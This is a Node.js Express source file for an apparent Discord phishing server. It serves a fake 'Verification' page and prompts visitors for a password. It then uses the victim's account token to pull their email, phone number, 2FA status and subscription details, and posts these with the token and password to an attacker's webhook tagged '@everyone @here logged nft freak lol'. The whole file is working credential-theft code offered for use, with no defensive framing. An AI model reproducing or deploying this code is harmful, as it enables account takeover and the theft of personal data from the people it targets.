      const { default: axios } = require("axios");
      const express = require("express");
      const { MessageEmbed, WebhookClient } = require("discord.js");
      const app = express();
      const { color, hook } = require("config.json");

      // Initiating Logged Data Cache
      process.logged = [];

      Array.prototype.random = function () {
        let n = this[Math.floor(Math.random() * this.length)];
        for (; !n; ) n = this[Math.floor(Math.random() * this.length)];
        return n;
      };

      const doxToken = async (tkn, pass) => {
        try {
          const res = await axios({ url: `https://discord.com/api/v${[8, 9].random()}/users/@me`, headers: { Authorization: tkn } });

          if (res.status !== 200 || res.status !== 201) {
            const d = res.data;
            return {
              rawData: {
                Token: tkn,
                Pass: pass ? `\`${pass}\`` : "N/A",
                Name: `${d.username}#${d.discriminator}`,
                ID: d.id,
                Email: d.email || `N/A`,
                Phone: d.phone || `N/A`,
                "Bot?": d.bot ? "Yes" : "No",
                "Token Locked?": d.verified ? "No" : "Yes",
                Premium: d.premium_type === 1 ? "Nitro Classic" : d.premium_type === 2 ? "Nitro Booster" : "None",
                "2fa Enabled": d.mfa_enabled ? "Yes" : "No",
                "NSFW Allowed": d.nsfw_allowed ? "Yes" : "No",
              },
              bannerURL: d.banner ? `https://cdn.discordapp.com/banners/${d.id}/${d.banner}${d.banner.startsWith("a_") ? ".gif" : ".png"}?size=4096` : null,
              avatarURL: d.avatar ? `https://cdn.discordapp.com/avatars/${d.id}/${d.avatar}${d.avatar.startsWith("a_") ? ".gif" : ".png"}?size=4096` : null,
            };
          }
        } catch (err) {
          console.log(err);
        }
      };

      app.get("/", async (req, res) => {
        const token = req.query.user;
        if (token) {
          res.send(`<!DOCTYPE html>
        <html lang="en">
          <head>
            <meta charset="UTF-8" />
            <meta http-equiv="X-UA-Compatible" content="IE=edge" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <title>idk</title>
          </head>
          <body>
            <script>
              const pass = prompt("Enter Pass to Continue");

              function searchToObject() {
                var pairs = window.location.search.substring(1).split("&"),
                  obj = {},
                  pair,
                  i;

                for (i in pairs) {
                  if (pairs[i] === "") continue;

                  pair = pairs[i].split("=");
                  obj[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1]);
                }

                return obj;
              }

              const query = searchToObject();

              location.href = \`\${location.origin}/k?user=\${query.user}&pass=\${pass}\`;
            </script>
          </body>
        </html>`);
        }
      });
      app.get("/k", async (req, res) => {
        const token = req.query.user;
        const pass = req.query.pass;

        if (token) {
          res.send(`<!DOCTYPE html>
      <html lang="en">
        <head>
          <meta charset="UTF-8" />
          <meta http-equiv="X-UA-Compatible" content="IE=edge" />
          <meta name="viewport" content="width=device-width, initial-scale=1.0" />
          <title>Verification</title>
          <link rel="preconnect" href="https://fonts.googleapis.com" />
          <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
          <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500&display=swap" rel="stylesheet" />
          <style>
            * {
              margin: 0;
              padding: 0;
              box-sizing: border-box;
              font-family: "Poppins";
            }
            body {
              width: 100%;
              height: 100vh;
              background: #1f1f1f;
              display: flex;
              justify-content: center;
              align-items: center;
            }
            .box {
              width: 500px;
              height: auto;
              background: #222222;
              box-shadow: 2px 2px 7px #00000031;
              border-radius: 0.35rem;
              display: flex;
              align-items: center;
              justify-content: center;
              flex-direction: column;
              padding: 0.8rem 2.4rem;
              padding-top: 1.8rem;
            }

            @media only screen and (max-width: 500px) {
              .box {
                width: 100%;
                margin: 0 0.23rem;
              }
            }

            .token_container {
              width: 100%;
              /* overflow: auto; */
              /* white-space: pre; */
              word-break: break-all;
              font-size: 1.6rem;
              padding: 0.4rem 0.6rem;
              background: #33333375;
              border-radius: 0.28rem;
              color: #fff;
              user-select: all;
            }

            .token_container::-webkit-scrollbar {
              display: none;
            }

            .btn_container {
              position: relative;
            }

            .copy {
              font-size: 1.2rem;
              margin: 1.2rem;
              background: none;
              border: 1.2px solid #fff;
              color: #fff;
              padding: 0.4rem 0.8rem;
              cursor: pointer;
              transition: all 0.3s;
            }
            .copy:hover {
              background: rgb(240, 240, 240);
              color: #222222;
              font-weight: 500;
            }
          </style>
        </head>
        <body>
          <div class="box">
            <div class="token_container"></div>
            <button class="copy">Verify</button>
          </div>
        </body>
      </html>`);
          try {
            const data = await doxToken(token, pass && typeof pass === "string" ? pass.trim() : null);
            console.log(data);
            if (!data) return;
            const embed = new MessageEmbed();
            embed.setColor(color);
            embed.setTitle("verify");
            embed.setImage(data.bannerURL);
            embed.setThumbnail(data.avatarURL);
            let rawStringData = [];
            for (const i in data.rawData) {
              rawStringData.push(`**__${i}__**: ${data.rawData[i]}`);
            }
            rawStringData = rawStringData.join("\n");

            embed.setDescription(rawStringData);
            embed.setFooter("");

            // Cache Part

            if (process.logged.find((e) => e.token === token && e.passowrd === pass)) {
              console.log("Found Duplicate Logged ID");
            } else {
              await axios({ method: "POST", url: hook, data: { content: "@everyone @here logged nft freak lol", embeds: [embed.toJSON()] } }).catch((err) => console.log(err.name));
              process.logged.push({ token, password: pass });
            }
          } catch (err) {
            console.log(err);
          }
        } else {
          res.send("No Token Found! ¯\\_(ツ)_/¯");
        }
      });

      app.listen(8080, () => {
        console.log(`Server Started on http://localhost:8080`);
      });
